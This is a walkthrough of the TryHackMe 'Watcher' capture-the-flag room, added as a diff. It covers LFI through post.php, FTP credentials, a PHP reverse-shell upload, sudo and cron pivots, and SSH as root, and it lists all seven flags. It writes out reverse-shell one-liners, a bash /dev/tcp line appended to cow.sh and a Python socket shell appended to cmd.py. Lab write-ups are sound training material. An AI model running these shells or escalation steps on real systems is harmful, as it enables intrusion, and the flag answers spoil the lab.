@@ -1,0 +1,156 @@
+# TRY HACK ME
+
+## ROOM [ Watcher ]
+
+---
+
+### Step 1 : ping and use nmap
+ping <ip> , nmap –sV <ip>
+
+Nmap output :
+
+PORT   STATE SERVICE VERSION
+21/tcp open  ftp     vsftpd 3.0.5
+22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.13 (Ubuntu Linux; protocol 2.0)
+80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
+Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel 
+
+---
+
+### Step 2 : check http:// <ip>   -> robots.txt
+
+---
+
+### Step 3 : check http://<ip>/flag_1.txt
+
+Flag 1: FLAG{robots_dot_text_what_is_next}
+
+---
+
+### Step 4 : check in url http://<ip>/post.php?post=/etc/passwd  - > LFI
+
+we are in root folder , move to the path that we got in robots.txt
+
+---
+
+### Step 5 : check http://<ip>/post.php?post=secret_file_do_not_read.txt
+
+got ftp path => /home/ftpuser/ftp/files , credentials ftpuser:givemefiles777   
+
+---
+
+### Step 6 : Login in to ssh , get all files , read flag_2.txt
+
+Flag 2 : FLAG{ftp_you_and_me}
+
+---
+
+### Step 7 : upload a reverse shell in ftp, in files folder. Listen through [ netcat nc –lvnp <port> ]
+
+---
+
+### Step 8 : trigger the shell using web page url
+
+http://<ip>/post.php?post=/home/ftpuser/ftp/files/shell.php 
+
+---
+
+### Step 9 : Got the shell access as  www-data  , enter find command to find the path for flag_3.txt
+
+find / -type f -name "flag_3.txt" 2>/dev/null
+
+Flag 3 : FLAG{lfi_what_a_guy}
+
+---
+
+### Step 10 : enter find command to know the flag_4.txt path 
+
+find / -type f -name "flag_4.txt" 2>/dev/null 
+
+you can’t get it  -> permission denied 
+
+---
+
+### Step 11 : Enter sudo –l 
+
+It shows (toby) NOPASSWD: ALL
+
+Run sudo -u toby /bin/bash , you got toby’s shell
+
+---
+
+### Step 12 : Now read flag_4.txt
+
+Flag 4 : FLAG{chad_lifestyle}
+
+---
+
+### Step 13 : read note.txt in toby folder , tells about cron jobs set up by mat  
+
+---
+
+### Step 14 : for flag_5.txt use find => find / -type f -name "flag_5.txt" 2>/dev/null
+
+---
+
+### Step 15 : It was in mat file , permission denied, move to [ cd jobs] , you will see cow.sh
+
+---
+
+### Step 16 : add reverse tcp connection using command
+
+echo "/bin/bash -i >& /dev/tcp/<your_ip>/4444 0>&1" >> cow.sh
+
+---
+
+### Step 17 : nc -lnvp 4444 , listen for the connection , it takes 1 min , for clarification , check cronjob .
+
+---
+
+### Step 18 : in netcat , you will get mat shell .
+
+---
+
+### Step 19 : move to the path and read the flag .
+
+Flag 5 : FLAG{live_by_the_cow_die_by_the_cow}
+
+---
+
+### Step 20 : next clue in note.txt,set up your sudo rights, use the python script
+
+---
+
+### Step 21 : sudo –l give (will) NOPASSWD: /usr/bin/python3  /home/mat/scripts/will_script.py *
+
+will_script.py for will and cmd.py for mat , but will_script use mat cmd.py , so we can add reverse tcp in cmd.py by
+
+echo 'import os, socket, pty; s=socket.socket(); s.connect((<your_ip>, 3333)); [os.dup2(s.fileno(), fd) for fd in (0, 1, 2)]; pty.spawn("/bin/bash")' >> cmd.py
+
+---
+
+### Step 22 : Run python code 
+
+sudo -u will /usr/bin/python3 /home/mat/scripts/will_script.py *
+
+Listen using netcat –lvnp 3333 
+
+---
+
+### Step 23 : you have got will shell , use find and get the flag_6.txt
+
+Flag 6 : FLAG{but_i_thought_my_script_was_secure}
+
+---
+
+### Step 24 : move to opt folder from root folder, i backups you have id_rsa  key.b64
+
+---
+
+### Step 25 : use ssh login -> ssh -i id_rsa root@<ip>
+
+---
+
+### Step 26 : ls to get flag_7.txt
+
+Flag 7 : FLAG{who_watches_the_watchers}
